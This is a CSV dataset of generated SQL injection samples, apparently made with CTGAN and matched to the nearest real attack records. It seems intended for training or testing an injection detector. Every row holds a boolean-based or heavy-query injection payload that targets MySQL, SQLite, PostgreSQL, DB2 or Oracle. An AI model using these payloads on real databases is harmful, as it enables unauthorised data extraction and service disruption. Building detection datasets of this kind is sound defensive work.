id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000447,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000038,5.577670550427989
CTGAN_000448,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000059,6.790154347848007
CTGAN_000449,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,7.705372237795793
CTGAN_000450,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,8.338118486259619
CTGAN_000451,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,7.437727233379235
CTGAN_000452,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,8.33522437064236
CTGAN_000453,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000077,6.225963314108829
CTGAN_000454,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,6.098336810097316
CTGAN_000455,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,7.023317968584808
CTGAN_000456,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,6.163446073908472
CTGAN_000457,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,5.6497385590851215
CTGAN_000458,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,6.783215372432513
CTGAN_000459,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,4.610469760765337
CTGAN_000460,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,6.991538037901692
CTGAN_000461,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,6.059533119165869
CTGAN_000462,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,6.09583804054015
CTGAN_000463,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000015,5.209568114300751
CTGAN_000464,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000122,7.2456299109770415
CTGAN_000465,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.638774716625042
CTGAN_000466,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000148,6.842409956607293
CTGAN_000467,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,7.291684501867193
CTGAN_000468,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,5.285301012483671
CTGAN_000469,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,9.123904601476866
CTGAN_000470,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,6.118072487567656
CTGAN_000471,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,6.276717843406764
CTGAN_000472,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,6.104803942560797
CTGAN_000473,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.825322931510317
CTGAN_000474,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,6.655673792915047
CTGAN_000475,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,7.738818341375846
CTGAN_000476,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,6.8914066870632
CTGAN_000477,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,7.156264482668784
CTGAN_000478,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.037572673044024
CTGAN_000479,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000008,4.457936930214553
CTGAN_000480,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,8.539490832094746
CTGAN_000481,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,5.997251366805657
CTGAN_000482,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000136,4.645750089228859
CTGAN_000483,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,7.247748657249669
CTGAN_000484,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,6.918040521962499
CTGAN_000485,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,5.122499234052921
CTGAN_000486,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000059,5.925590216802332
CTGAN_000487,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,6.006837073388196
CTGAN_000488,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000022,6.828094577995683
CTGAN_000489,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,7.035323810948945
CTGAN_000490,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000028,6.0640943378235495
CTGAN_000491,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000059,6.219017810856932
CTGAN_000492,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000026,5.498682685777908
CTGAN_000493,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,7.237247325484389
CTGAN_000494,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,6.117069659306565
CTGAN_000495,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000141,7.887311835758048
CTGAN_000496,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,5.487467194561951
CTGAN_000497,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,6.560624790409803
CTGAN_000498,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000136,7.097208078628455
CTGAN_000499,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.565466834590703
CTGAN_000500,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,7.088842671665339
